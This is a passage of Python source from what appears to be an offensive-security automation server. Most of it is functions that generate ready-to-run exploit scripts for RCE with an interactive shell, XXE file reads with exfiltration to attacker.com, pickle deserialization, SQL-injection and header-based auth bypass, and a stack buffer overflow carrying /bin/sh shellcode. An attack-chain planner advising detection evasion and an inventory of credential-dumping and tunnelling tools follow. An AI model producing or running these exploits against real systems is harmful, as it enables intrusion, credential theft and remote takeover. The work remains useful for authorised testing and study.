    
    print(f"[+] RCE Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    if exploit.test_rce(command):
        print("[+] RCE vulnerability confirmed!")
        
        # Interactive shell
        while True:
            try:
                cmd = input("RCE> ").strip()
                if cmd.lower() in ['exit', 'quit']:
                    break
                if cmd:
                    exploit.execute_command(cmd)
            except KeyboardInterrupt:
                break
    else:
        print("[-] No RCE vulnerability found")

if __name__ == "__main__":
    main()
'''

    def _generate_xxe_exploit(self, cve_data, target_info, details):
        """Generate XXE exploit based on CVE details"""
        cve_id = cve_data.get("cve_id", "")
        
        return f'''#!/usr/bin/env python3
# XXE (XML External Entity) Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...

import requests
import sys

class XXEExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def generate_xxe_payloads(self):
        """Generate XXE payloads"""
        payloads = [
            # Basic file read
            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\\n<root>&xxe;</root>',
            
            # Windows file read
            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]>\\n<root>&xxe;</root>',
            
            # HTTP request (SSRF)
            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>\\n<root>&xxe;</root>',
            
            # Parameter entity
            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [\\n<!ENTITY % xxe SYSTEM "file:///etc/passwd">\\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \\'http://attacker.com/?%xxe;\\'>">\\n%param1;\\n]>\\n<root>&exfil;</root>'
        ]
        
        return payloads
    
    def test_xxe(self):
        """Test for XXE vulnerability"""
        print("[+] Testing XXE vulnerability...")
        
        payloads = self.generate_xxe_payloads()
        
        for i, payload in enumerate(payloads):
            try:
                headers = {{"Content-Type": "application/xml"}}
                response = self.session.post(
                    self.target_url,
                    data=payload,
                    headers=headers
                )
                
                # Check for file content indicators
                indicators = [
                    "root:", "daemon:", "bin:",  # /etc/passwd
                    "localhost", "127.0.0.1",   # hosts file
                    "<?xml", "<!DOCTYPE"        # XML processing
                ]
                
                if any(indicator in response.text for indicator in indicators):
                    print(f"[+] XXE vulnerability found with payload {{i+1}}")
                    print(f"[+] Response: {{response.text[:200]}}...")
                    return True
                    
            except Exception as e:
                continue
                
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com/xml")
        sys.exit(1)
    
    target_url = sys.argv[1]
    exploit = XXEExploit(target_url)
    
    print(f"[+] XXE Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    if exploit.test_xxe():
        print("[+] XXE vulnerability confirmed!")
    else:
        print("[-] No XXE vulnerability found")

if __name__ == "__main__":
    main()
'''

    def _generate_deserialization_exploit(self, cve_data, target_info, details):
        """Generate deserialization exploit based on CVE details"""
        cve_id = cve_data.get("cve_id", "")
        
        return f'''#!/usr/bin/env python3
# Deserialization Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...

import requests
import sys
import base64
import pickle
import json

class DeserializationExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def create_pickle_payload(self, command):
        """Create malicious pickle payload"""
        class ExploitPayload:
            def __reduce__(self):
                import subprocess
                return (subprocess.call, ([command], ))
        
        payload = ExploitPayload()
        serialized = pickle.dumps(payload)
        encoded = base64.b64encode(serialized).decode()
        return encoded
    
    def test_deserialization(self):
        """Test for deserialization vulnerabilities"""
        print("[+] Testing deserialization vulnerability...")
        
        test_command = "ping -c 1 127.0.0.1"  # Safe test command
        
        # Test different serialization formats
        payloads = {{
            "pickle": self.create_pickle_payload(test_command),
            "json": json.dumps({{"__type__": "os.system", "command": test_command}}),
            "java": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF4"
        }}
        
        for format_type, payload in payloads.items():
            try:
                # Test different parameters
                test_params = ["data", "payload", "object", "serialized"]
                
                for param in test_params:
                    response = self.session.post(
                        self.target_url,
                        data={{param: payload}}
                    )
                    
                    # Check for deserialization indicators
                    if response.status_code in [200, 500] and len(response.text) > 0:
                        print(f"[+] Potential {{format_type}} deserialization found")
                        return True
                        
            except Exception as e:
                continue
                
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com/deserialize")
        sys.exit(1)
    
    target_url = sys.argv[1]
    exploit = DeserializationExploit(target_url)
    
    print(f"[+] Deserialization Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    if exploit.test_deserialization():
        print("[+] Deserialization vulnerability confirmed!")
    else:
        print("[-] No deserialization vulnerability found")

if __name__ == "__main__":
    main()
'''

    def _generate_auth_bypass_exploit(self, cve_data, target_info, details):
        """Generate authentication bypass exploit"""
        cve_id = cve_data.get("cve_id", "")
        
        return f'''#!/usr/bin/env python3
# Authentication Bypass Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...

import requests
import sys

class AuthBypassExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def test_sql_auth_bypass(self):
        """Test SQL injection authentication bypass"""
        print("[+] Testing SQL injection auth bypass...")
        
        bypass_payloads = [
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "') or '1'='1--",
            "admin' or '1'='1",
        ]
        
        for payload in bypass_payloads:
            try:
                data = {{
                    "username": payload,
                    "password": "anything"
                }}
                
                response = self.session.post(
                    f"{{self.target_url}}/login",
                    data=data
                )
                
                # Check for successful login indicators
                success_indicators = [
                    "dashboard", "welcome", "logout", "admin panel",
                    "successful", "redirect"
                ]
                
                if any(indicator in response.text.lower() for indicator in success_indicators):
                    print(f"[+] SQL injection bypass successful: {{payload}}")
                    return True
                    
            except Exception as e:
                continue
                
        return False
    
    def test_header_bypass(self):
        """Test header-based authentication bypass"""
        print("[+] Testing header-based auth bypass...")
        
        bypass_headers = [
            {{"X-Forwarded-For": "127.0.0.1"}},
            {{"X-Real-IP": "127.0.0.1"}},
            {{"X-Remote-User": "admin"}},
            {{"X-Forwarded-User": "admin"}},
            {{"Authorization": "Bearer admin"}},
        ]
        
        for headers in bypass_headers:
            try:
                response = self.session.get(
                    f"{{self.target_url}}/admin",
                    headers=headers
                )
                
                if response.status_code == 200:
                    print(f"[+] Header bypass successful: {{headers}}")
                    return True
                    
            except Exception as e:
                continue
                
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    exploit = AuthBypassExploit(target_url)
    
    print(f"[+] Authentication Bypass Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    success = False
    if exploit.test_sql_auth_bypass():
        print("[+] SQL injection authentication bypass confirmed!")
        success = True
        
    if exploit.test_header_bypass():
        print("[+] Header-based authentication bypass confirmed!")
        success = True
        
    if not success:
        print("[-] No authentication bypass found")

if __name__ == "__main__":
    main()
'''

    def _generate_buffer_overflow_exploit(self, cve_data, target_info, details):
        """Generate buffer overflow exploit"""
        cve_id = cve_data.get("cve_id", "")
        arch = target_info.get("target_arch", "x64")
        
        return f'''#!/usr/bin/env python3
# Buffer Overflow Exploit for {cve_id}
# Architecture: {arch}
# Vulnerability: {cve_data.get("description", "")[:100]}...

import struct
import socket
import sys

class BufferOverflowExploit:
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = int(target_port)
        
    def create_pattern(self, length):
        """Create cyclic pattern for offset discovery"""
        pattern = ""
        for i in range(length):
            pattern += chr(65 + (i % 26))  # A-Z pattern
        return pattern
    
    def generate_shellcode(self):
        """Generate shellcode for {arch}"""
        if "{arch}" == "x86":
            # x86 execve("/bin/sh") shellcode
            shellcode = (
                "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
                "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
            )
        else:
            # x64 execve("/bin/sh") shellcode
            shellcode = (
                "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73"
                "\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
            )
        
        return shellcode.encode('latin-1')
    
    def create_exploit(self, offset=140):
        """Create buffer overflow exploit"""
        print(f"[+] Creating buffer overflow exploit...")
        print(f"[+] Offset: {{offset}} bytes")
        
        # Pattern to reach return address
        padding = "A" * offset
        
        if "{arch}" == "x86":
            # x86 return address (example)
            ret_addr = struct.pack("<I", 0x08048080)  # Adjust for target
        else:
            # x64 return address (example)
            ret_addr = struct.pack("<Q", 0x0000000000401000)  # Adjust for target
        
        # NOP sled
        nop_sled = "\\x90" * 16
        
        # Shellcode
        shellcode = self.generate_shellcode()
        
        exploit = padding.encode() + ret_addr + nop_sled.encode('latin-1') + shellcode
        
        print(f"[+] Exploit size: {{len(exploit)}} bytes")
        return exploit
    
    def send_exploit(self, payload):
        """Send exploit to target"""
        try:
            print(f"[+] Connecting to {{self.target_host}}:{{self.target_port}}")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_host, self.target_port))
            
            print("[+] Sending exploit...")
            sock.send(payload)
            
            # Try to interact
            try:
                response = sock.recv(1024)
                print(f"[+] Response: {{response}}")
            except:
                pass
                
            sock.close()
            print("[+] Exploit sent successfully")
            
        except Exception as e:
            print(f"[-] Error: {{e}}")

def main():
    if len(sys.argv) != 3:
        print(f"Usage: python3 {{sys.argv[0]}} <target_host> <target_port>")
        print(f"Example: python3 {{sys.argv[0]}} 192.168.1.100 9999")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = sys.argv[2]
    
    exploit = BufferOverflowExploit(target_host, target_port)
    
    print(f"[+] Buffer Overflow Exploit for {cve_id}")
    print(f"[+] Target: {{target_host}}:{{target_port}}")
    print(f"[+] Architecture: {arch}")
    
    # Create and send exploit
    payload = exploit.create_exploit()
    exploit.send_exploit(payload)

if __name__ == "__main__":
    main()
'''

    def _generate_usage_instructions(self, vuln_type, params):
        """Generate usage instructions for the exploit"""
        instructions = [
            f"# Exploit for CVE {params['cve_id']}",
            f"# Vulnerability Type: {vuln_type}",
            "",
            "## Usage Instructions:",
            "1. Ensure target is vulnerable to this CVE",
            "2. Adjust target parameters as needed",
            "3. Test in controlled environment first",
            "4. Execute with appropriate permissions",
            "",
            "## Testing:",
            f"python3 exploit.py {params.get('target_ip', '')} {params.get('target_port', '')}"
        ]

        if vuln_type == "buffer_overflow":
            instructions.extend([
                "",
                "## Buffer Overflow Notes:",
                f"- Offset: {params.get('offset', 'Unknown')}",
                f"- Return address: {params.get('ret_address', 'Unknown')}",
                "- Verify addresses match target binary",
                "- Disable ASLR for testing: echo 0 > /proc/sys/kernel/randomize_va_space"
            ])

        return "\n".join(instructions)

class VulnerabilityCorrelator:
    """Correlate vulnerabilities for multi-stage attack chain discovery"""

    def __init__(self):
        self.attack_patterns = {
            "privilege_escalation": ["local", "kernel", "suid", "sudo"],
            "remote_execution": ["remote", "network", "rce", "code execution"],
            "persistence": ["service", "registry", "scheduled", "startup"],
            "lateral_movement": ["smb", "wmi", "ssh", "rdp"],
            "data_exfiltration": ["file", "database", "memory", "network"]
        }

        self.software_relationships = {
            "windows": ["iis", "office", "exchange", "sharepoint"],
            "linux": ["apache", "nginx", "mysql", "postgresql"],
            "web": ["php", "nodejs", "python", "java"],
            "database": ["mysql", "postgresql", "oracle", "mssql"]
        }

    def find_attack_chains(self, target_software, max_depth=3):
        """Find multi-vulnerability attack chains"""
        try:
            # This is a simplified implementation
            # Real version would use graph algorithms and ML

            chains = []

            # Example attack chain discovery logic
            base_software = target_software.lower()

            # Find initial access vulnerabilities
            initial_vulns = self._find_vulnerabilities_by_pattern(base_software, "remote_execution")

            for initial_vuln in initial_vulns[:3]:  # Limit for demo
                chain = {
                    "chain_id": f"chain_{len(chains) + 1}",
                    "target": target_software,
                    "stages": [
                        {
                            "stage": 1,
                            "objective": "Initial Access",
                            "vulnerability": initial_vuln,
                            "success_probability": 0.75
                        }
                    ],
                    "overall_probability": 0.75,
                    "complexity": "MEDIUM"
                }

                # Find privilege escalation
                priv_esc_vulns = self._find_vulnerabilities_by_pattern(base_software, "privilege_escalation")
                if priv_esc_vulns:
                    chain["stages"].append({
                        "stage": 2,
                        "objective": "Privilege Escalation",
                        "vulnerability": priv_esc_vulns[0],
                        "success_probability": 0.60
                    })
                    chain["overall_probability"] *= 0.60

                # Find persistence
                persistence_vulns = self._find_vulnerabilities_by_pattern(base_software, "persistence")
                if persistence_vulns and len(chain["stages"]) < max_depth:
                    chain["stages"].append({
                        "stage": 3,
                        "objective": "Persistence",
                        "vulnerability": persistence_vulns[0],
                        "success_probability": 0.80
                    })
                    chain["overall_probability"] *= 0.80

                chains.append(chain)

            return {
                "success": True,
                "target_software": target_software,
                "total_chains": len(chains),
                "attack_chains": chains,
                "recommendation": self._generate_chain_recommendations(chains)
            }

        except Exception as e:
            logger.error(f"Error finding attack chains: {str(e)}")
            return {"success": False, "error": str(e)}

    def _find_vulnerabilities_by_pattern(self, software, pattern_type):
        """Find vulnerabilities matching attack pattern"""
        # Simplified mock data - real implementation would query CVE database
        mock_vulnerabilities = [
            {
                "cve_id": "CVE-2024-1234",
                "description": f"Remote code execution in {software}",
                "cvss_score": 9.8,
                "exploitability": "HIGH"
            },
            {
                "cve_id": "CVE-2024-5678",
                "description": f"Privilege escalation in {software}",
                "cvss_score": 7.8,
                "exploitability": "MEDIUM"
            }
        ]

        return mock_vulnerabilities

    def _generate_chain_recommendations(self, chains):
        """Generate recommendations for attack chains"""
        if not chains:
            return "No viable attack chains found for target"

        recommendations = [
            f"Found {len(chains)} potential attack chains",
            f"Highest probability chain: {max(chains, key=lambda x: x['overall_probability'])['overall_probability']:.2%}",
            "Recommendations:",
            "- Test chains in order of probability",
            "- Prepare fallback methods for each stage",
            "- Consider detection evasion at each stage"
        ]

        return "\n".join(recommendations)

# Global intelligence managers
cve_intelligence = CVEIntelligenceManager()
exploit_generator = AIExploitGenerator()
vulnerability_correlator = VulnerabilityCorrelator()

def execute_command(command: str, use_cache: bool = True) -> Dict[str, Any]:
    """
    Execute a shell command with enhanced features

    Args:
        command: The command to execute
        use_cache: Whether to use caching for this command

    Returns:
        A dictionary containing the stdout, stderr, return code, and metadata
    """

    # Check cache first
    if use_cache:
        cached_result = cache.get(command, {})
        if cached_result:
            return cached_result

    # Execute command
    executor = EnhancedCommandExecutor(command)
    result = executor.execute()

    # Cache successful results
    if use_cache and result.get("success", False):
        cache.set(command, {}, result)

    return result

def execute_command_with_recovery(tool_name: str, command: str, parameters: Dict[str, Any] = None,
                                 use_cache: bool = True, max_attempts: int = 3) -> Dict[str, Any]:
    """
    Execute a command with intelligent error handling and recovery

    Args:
        tool_name: Name of the tool being executed
        command: The command to execute
        parameters: Tool parameters for context
        use_cache: Whether to use caching
        max_attempts: Maximum number of recovery attempts

    Returns:
        A dictionary containing execution results with recovery information
    """
    if parameters is None:
        parameters = {}

    # Inject global proxy if configured and tool supports it
    command = inject_proxy(tool_name, command)

    attempt_count = 0
    last_error = None
    recovery_history = []

    while attempt_count < max_attempts:
        attempt_count += 1

        try:
            # Execute the command
            result = execute_command(command, use_cache)

            # Check if execution was successful
            if result.get("success", False):
                # Add recovery information to successful result
                result["recovery_info"] = {
                    "attempts_made": attempt_count,
                    "recovery_applied": len(recovery_history) > 0,
                    "recovery_history": recovery_history
                }
                return result

            # Command failed, determine if we should attempt recovery
            error_message = result.get("stderr", "Unknown error")
            exception = Exception(error_message)

            # Create context for error handler
            context = {
                "target": parameters.get("target", "unknown"),
                "parameters": parameters,
                "attempt_count": attempt_count,
                "command": command
            }

            # Get recovery strategy from error handler
            recovery_strategy = error_handler.handle_tool_failure(tool_name, exception, context)
            recovery_history.append({
                "attempt": attempt_count,
                "error": error_message,
                "recovery_action": recovery_strategy.action.value,
                "timestamp": datetime.now().isoformat()
            })

            # Apply recovery strategy
            if recovery_strategy.action == RecoveryAction.RETRY_WITH_BACKOFF:
                delay = recovery_strategy.parameters.get("initial_delay", 5)
                backoff = recovery_strategy.parameters.get("max_delay", 60)
                actual_delay = min(delay * (recovery_strategy.backoff_multiplier ** (attempt_count - 1)), backoff)

                retry_info = f'Retrying in {actual_delay}s (attempt {attempt_count}/{max_attempts})'
                logger.info(f"{ModernVisualEngine.format_tool_status(tool_name, 'RECOVERY', retry_info)}")
                time.sleep(actual_delay)
                continue

            elif recovery_strategy.action == RecoveryAction.RETRY_WITH_REDUCED_SCOPE:
                # Adjust parameters to reduce scope
                adjusted_params = error_handler.auto_adjust_parameters(
                    tool_name,
                    error_handler.classify_error(error_message, exception),
                    parameters
                )

                # Rebuild command with adjusted parameters
                command = _rebuild_command_with_params(tool_name, command, adjusted_params)
                logger.info(f"🔧 Retrying {tool_name} with reduced scope")
                continue

            elif recovery_strategy.action == RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL:
                # Get alternative tool
                alternative_tool = error_handler.get_alternative_tool(tool_name, recovery_strategy.parameters)

                if alternative_tool:
                    switch_info = f'Switching to alternative: {alternative_tool}'
                    logger.info(f"{ModernVisualEngine.format_tool_status(tool_name, 'RECOVERY', switch_info)}")
                    # This would require the calling function to handle tool switching
                    result["alternative_tool_suggested"] = alternative_tool
                    result["recovery_info"] = {
                        "attempts_made": attempt_count,
                        "recovery_applied": True,
                        "recovery_history": recovery_history,
                        "final_action": "tool_switch_suggested"
                    }
                    return result
                else:
                    logger.warning(f"⚠️  No alternative tool found for {tool_name}")

            elif recovery_strategy.action == RecoveryAction.ADJUST_PARAMETERS:
                # Adjust parameters based on error type
                error_type = error_handler.classify_error(error_message, exception)
                adjusted_params = error_handler.auto_adjust_parameters(tool_name, error_type, parameters)

                # Rebuild command with adjusted parameters
                command = _rebuild_command_with_params(tool_name, command, adjusted_params)
                logger.info(f"🔧 Retrying {tool_name} with adjusted parameters")
                continue

            elif recovery_strategy.action == RecoveryAction.ESCALATE_TO_HUMAN:
                # Create error context for escalation
                error_context = ErrorContext(
                    tool_name=tool_name,
                    target=parameters.get("target", "unknown"),
                    parameters=parameters,
                    error_type=error_handler.classify_error(error_message, exception),
                    error_message=error_message,
                    attempt_count=attempt_count,
                    timestamp=datetime.now(),
                    stack_trace="",
                    system_resources=error_handler._get_system_resources()
                )

                escalation_data = error_handler.escalate_to_human(
                    error_context,
                    recovery_strategy.parameters.get("urgency", "medium")
                )

                result["human_escalation"] = escalation_data
                result["recovery_info"] = {
                    "attempts_made": attempt_count,
                    "recovery_applied": True,
                    "recovery_history": recovery_history,
                    "final_action": "human_escalation"
                }
                return result

            elif recovery_strategy.action == RecoveryAction.GRACEFUL_DEGRADATION:
                # Apply graceful degradation
                operation = _determine_operation_type(tool_name)
                degraded_result = degradation_manager.handle_partial_failure(
                    operation,
                    result,
                    [tool_name]
                )

                degraded_result["recovery_info"] = {
                    "attempts_made": attempt_count,
                    "recovery_applied": True,
                    "recovery_history": recovery_history,
                    "final_action": "graceful_degradation"
                }
                return degraded_result

            elif recovery_strategy.action == RecoveryAction.ABORT_OPERATION:
                logger.error(f"🛑 Aborting {tool_name} operation after {attempt_count} attempts")
                result["recovery_info"] = {
                    "attempts_made": attempt_count,
                    "recovery_applied": True,
                    "recovery_history": recovery_history,
                    "final_action": "operation_aborted"
                }
                return result

            last_error = exception

        except Exception as e:
            last_error = e
            logger.error(f"💥 Unexpected error in recovery attempt {attempt_count}: {str(e)}")

            # If this is the last attempt, escalate to human
            if attempt_count >= max_attempts:
                error_context = ErrorContext(
                    tool_name=tool_name,
                    target=parameters.get("target", "unknown"),
                    parameters=parameters,
                    error_type=ErrorType.UNKNOWN,
                    error_message=str(e),
                    attempt_count=attempt_count,
                    timestamp=datetime.now(),
                    stack_trace=traceback.format_exc(),
                    system_resources=error_handler._get_system_resources()
                )

                escalation_data = error_handler.escalate_to_human(error_context, "high")

                return {
                    "success": False,
                    "error": str(e),
                    "human_escalation": escalation_data,
                    "recovery_info": {
                        "attempts_made": attempt_count,
                        "recovery_applied": True,
                        "recovery_history": recovery_history,
                        "final_action": "human_escalation_after_failure"
                    }
                }

    # All attempts exhausted
    logger.error(f"🚫 All recovery attempts exhausted for {tool_name}")
    return {
        "success": False,
        "error": f"All recovery attempts exhausted: {str(last_error)}",
        "recovery_info": {
            "attempts_made": attempt_count,
            "recovery_applied": True,
            "recovery_history": recovery_history,
            "final_action": "all_attempts_exhausted"
        }
    }

def _rebuild_command_with_params(tool_name: str, original_command: str, new_params: Dict[str, Any]) -> str:
    """Rebuild command with new parameters"""
    # This is a simplified implementation - in practice, you'd need tool-specific logic
    # For now, we'll just append new parameters
    additional_args = []

    for key, value in new_params.items():
        if key == "timeout" and tool_name in ["nmap", "gobuster", "nuclei"]:
            additional_args.append(f"--timeout {value}")
        elif key == "threads" and tool_name in ["gobuster", "feroxbuster", "ffuf"]:
            additional_args.append(f"-t {value}")
        elif key == "delay" and tool_name in ["gobuster", "feroxbuster"]:
            additional_args.append(f"--delay {value}")
        elif key == "timing" and tool_name == "nmap":
            additional_args.append(f"{value}")
        elif key == "concurrency" and tool_name == "nuclei":
            additional_args.append(f"-c {value}")
        elif key == "rate-limit" and tool_name == "nuclei":
            additional_args.append(f"-rl {value}")

    if additional_args:
        return f"{original_command} {' '.join(additional_args)}"

    return original_command

def _determine_operation_type(tool_name: str) -> str:
    """Determine operation type based on tool name"""
    operation_mapping = {
        "nmap": "network_discovery",
        "rustscan": "network_discovery",
        "masscan": "network_discovery",
        "gobuster": "web_discovery",
        "feroxbuster": "web_discovery",
        "dirsearch": "web_discovery",
        "ffuf": "web_discovery",
        "nuclei": "vulnerability_scanning",
        "jaeles": "vulnerability_scanning",
        "nikto": "vulnerability_scanning",
        "subfinder": "subdomain_enumeration",
        "amass": "subdomain_enumeration",
        "assetfinder": "subdomain_enumeration",
        "arjun": "parameter_discovery",
        "paramspider": "parameter_discovery",
        "x8": "parameter_discovery"
    }

    return operation_mapping.get(tool_name, "unknown_operation")

# File Operations Manager
class FileOperationsManager:
    """Handle file operations with security and validation"""

    def __init__(self, base_dir: str = "/tmp/hexstrike_files"):
        self.base_dir = Path(base_dir)
        self.base_dir.mkdir(exist_ok=True)
        self.max_file_size = 100 * 1024 * 1024  # 100MB

    def create_file(self, filename: str, content: str, binary: bool = False) -> Dict[str, Any]:
        """Create a file with the specified content"""
        try:
            file_path = self.base_dir / filename
            file_path.parent.mkdir(parents=True, exist_ok=True)

            if len(content.encode()) > self.max_file_size:
                return {"success": False, "error": f"File size exceeds {self.max_file_size} bytes"}

            mode = "wb" if binary else "w"
            with open(file_path, mode) as f:
                if binary:
                    f.write(content.encode() if isinstance(content, str) else content)
                else:
                    f.write(content)

            logger.info(f"📄 Created file: {filename} ({len(content)} bytes)")
            return {"success": True, "path": str(file_path), "size": len(content)}

        except Exception as e:
            logger.error(f"❌ Error creating file {filename}: {e}")
            return {"success": False, "error": str(e)}

    def modify_file(self, filename: str, content: str, append: bool = False) -> Dict[str, Any]:
        """Modify an existing file"""
        try:
            file_path = self.base_dir / filename
            if not file_path.exists():
                return {"success": False, "error": "File does not exist"}

            mode = "a" if append else "w"
            with open(file_path, mode) as f:
                f.write(content)

            logger.info(f"✏️  Modified file: {filename}")
            return {"success": True, "path": str(file_path)}

        except Exception as e:
            logger.error(f"❌ Error modifying file {filename}: {e}")
            return {"success": False, "error": str(e)}

    def delete_file(self, filename: str) -> Dict[str, Any]:
        """Delete a file or directory"""
        try:
            file_path = self.base_dir / filename
            if not file_path.exists():
                return {"success": False, "error": "File does not exist"}

            if file_path.is_dir():
                shutil.rmtree(file_path)
            else:
                file_path.unlink()

            logger.info(f"🗑️  Deleted: {filename}")
            return {"success": True}

        except Exception as e:
            logger.error(f"❌ Error deleting {filename}: {e}")
            return {"success": False, "error": str(e)}

    def list_files(self, directory: str = ".") -> Dict[str, Any]:
        """List files in a directory"""
        try:
            dir_path = self.base_dir / directory
            if not dir_path.exists():
                return {"success": False, "error": "Directory does not exist"}

            files = []
            for item in dir_path.iterdir():
                files.append({
                    "name": item.name,
                    "type": "directory" if item.is_dir() else "file",
                    "size": item.stat().st_size if item.is_file() else 0,
                    "modified": datetime.fromtimestamp(item.stat().st_mtime).isoformat()
                })

            return {"success": True, "files": files}

        except Exception as e:
            logger.error(f"❌ Error listing files in {directory}: {e}")
            return {"success": False, "error": str(e)}

# Global file operations manager
file_manager = FileOperationsManager()

# API Routes

@app.route("/health", methods=["GET"])
def health_check():
    """Health check endpoint with comprehensive tool detection"""

    essential_tools = [
        "nmap", "gobuster", "dirb", "nikto", "sqlmap", "hydra", "john", "hashcat"
    ]

    network_tools = [
        "rustscan", "masscan", "autorecon", "nbtscan", "arp-scan", "responder",
        "nxc", "enum4linux-ng", "rpcclient", "enum4linux"
    ]

    web_security_tools = [
        "ffuf", "feroxbuster", "dirsearch", "dotdotpwn", "xsser", "wfuzz",
        "waybackurls", "arjun", "paramspider", "x8", "jaeles",
        "httpx", "wafw00f", "burpsuite", "zaproxy", "katana", "hakrawler"
    ]

    vuln_scanning_tools = [
        "nuclei", "wpscan", "graphql-scanner", "jwt-analyzer"
    ]

    password_tools = [
        "medusa", "patator", "hash-identifier", "ophcrack", "hashcat-utils"
    ]

    binary_tools = [
        "gdb", "radare2", "binwalk", "ropgadget", "checksec", "objdump",
        "ghidra", "pwntools", "one-gadget", "ropper", "angr", "libc-database",
        "pwninit"
    ]

    forensics_tools = [
        "volatility3", "vol", "steghide", "hashpump", "foremost", "exiftool",
        "strings", "xxd", "file", "photorec", "testdisk", "scalpel", "bulk-extractor",
        "stegsolve", "zsteg", "outguess"
    ]

    cloud_tools = [
        "prowler", "scout-suite", "trivy", "kube-hunter", "kube-bench",
        "docker-bench-security", "checkov", "terrascan", "falco", "clair"
    ]

    # v7.0: New cloud tools
    cloud_tools_v7 = [
        "s3scanner", "cloudbrute"
    ]

    osint_tools = [
        "amass", "subfinder", "fierce", "dnsenum", "theharvester", "sherlock",
        "social-analyzer", "recon-ng", "maltego", "spiderfoot", "shodan-cli",
        "censys-cli", "have-i-been-pwned"
    ]

    exploitation_tools = [
        "metasploit", "exploit-db", "searchsploit"
    ]

    api_tools = [
        "api-schema-analyzer", "postman", "insomnia", "curl", "httpie", "anew", "qsreplace", "uro"
    ]

    wireless_tools = [
        "kismet", "wireshark", "tshark", "tcpdump"
    ]

    additional_tools = [
        "smbmap", "volatility", "sleuthkit", "autopsy", "evil-winrm",
        "paramspider", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng",
        "msfvenom", "msfconsole", "graphql-scanner", "jwt-analyzer"
    ]

    # v7.0: New tool categories
    ad_tools = [
        "bloodhound-python", "kerbrute", "certipy", "ldapdomaindump",
        "coercer", "lsassy", "impacket-secretsdump", "impacket-psexec", "impacket-wmiexec"
    ]

    web_tools_v7 = [
        "dalfox", "ghauri", "commix", "crlfuzz", "subzy", "gau",
        "graphql-cop", "smuggler"
    ]

    network_tools_v7 = [
        "naabu", "dnsx", "tlsx", "uncover", "asnmap", "shuffledns", "interactsh-client"
    ]

    secrets_tools = [
        "trufflehog", "gitleaks", "semgrep"
    ]

    mobile_tools = [
        "frida", "frida-ps", "objection", "apktool", "apkleaks", "jadx"
    ]

    postex_tools = [
        "ligolo-ng", "chisel"
    ]

    all_tools = (
        essential_tools + network_tools + web_security_tools + vuln_scanning_tools +
        password_tools + binary_tools + forensics_tools + cloud_tools + cloud_tools_v7 +
        osint_tools + exploitation_tools + api_tools + wireless_tools + additional_tools +
        ad_tools + web_tools_v7 + network_tools_v7 + secrets_tools + mobile_tools + postex_tools
    )
    import shutil
    seen = set()
    tools_status = {}
    for tool in all_tools:
        if tool not in seen:
            seen.add(tool)
            tools_status[tool] = shutil.which(tool) is not None

    all_essential_tools_available = all(tools_status[tool] for tool in essential_tools)

    category_stats = {
        "essential": {"total": len(essential_tools), "available": sum(1 for tool in essential_tools if tools_status.get(tool, False))},
        "network": {"total": len(network_tools), "available": sum(1 for tool in network_tools if tools_status.get(tool, False))},
        "web_security": {"total": len(web_security_tools), "available": sum(1 for tool in web_security_tools if tools_status.get(tool, False))},
        "vuln_scanning": {"total": len(vuln_scanning_tools), "available": sum(1 for tool in vuln_scanning_tools if tools_status.get(tool, False))},
        "password": {"total": len(password_tools), "available": sum(1 for tool in password_tools if tools_status.get(tool, False))},
        "binary": {"total": len(binary_tools), "available": sum(1 for tool in binary_tools if tools_status.get(tool, False))},
        "forensics": {"total": len(forensics_tools), "available": sum(1 for tool in forensics_tools if tools_status.get(tool, False))},
        "cloud": {"total": len(cloud_tools) + len(cloud_tools_v7), "available": sum(1 for tool in cloud_tools + cloud_tools_v7 if tools_status.get(tool, False))},
